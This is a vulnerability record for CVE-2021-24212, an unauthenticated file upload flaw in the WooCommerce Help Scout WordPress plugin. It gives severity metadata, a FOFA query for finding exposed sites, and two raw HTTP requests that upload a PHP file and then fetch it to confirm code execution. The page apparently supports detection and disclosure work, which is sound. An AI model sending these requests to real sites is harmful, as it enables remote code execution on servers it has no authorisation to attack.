---
layout: post
cve_id: CVE-2021-24212
title: WooCommerce Help Scout - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24212.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24212.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Unauthenticated attackers can upload malicious files, potentially leading
  to remote code execution or site compromise.

  '
remediation: 'Update to version 2.9.1 or later.

  '
reference:
- https://wpscan.com/vulnerability/cf9305e8-f5bc-45c3-82db-0ef00fd46129/
- https://sploitus.com/exploit?id=WPEX-ID:CF9305E8-F5BC-45C3-82DB-0EF00FD46129
- https://nvd.nist.gov/vuln/detail/CVE-2021-24212
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-24212
  cwe-id: CWE-434
  epss-score: 0.68228
  epss-percentile: 0.98538
metadata:
  verified: false
  max-request: 2
  vendor: woocommerce
  product: help_scout
  fofa-query: body="/wp-content/plugins/woocommerce-help-scout"
tags:
- cve
- cve2021
- wp
- wordpress
- wp-plugin
- file-upload
- rce
- woocommerce-help-scout
- vkev
---

## üîç Vulnerability Description
WooCommerce Help Scout plugin before version 2.9.1 contains an unrestricted file upload vulnerability. The vulnerability allows unauthenticated users to upload arbitrary files to the server which by default will end up in wp-content/uploads/hstmp/ directory, potentially leading to remote code execution.


## üåê HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php?action=wc_help_scout_upload_attachments HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Connection: close
Content-Length: 227
Content-Type: multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf
Accept-Encoding: gzip
------------------------NCpI6tN3BZW3fz1Y9t2bkf
Content-Disposition: form-data; name="file"; filename="kJCRZVIa"
Content-Type: application/x-php
<?php echo md5('3935'); ?>
------------------------NCpI6tN3BZW3fz1Y9t2bkf--
```

```nohighlight
GET /wp-content/uploads/hstmp/kJCRZVIa HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Connection: close
Accept-Encoding: gzip
```

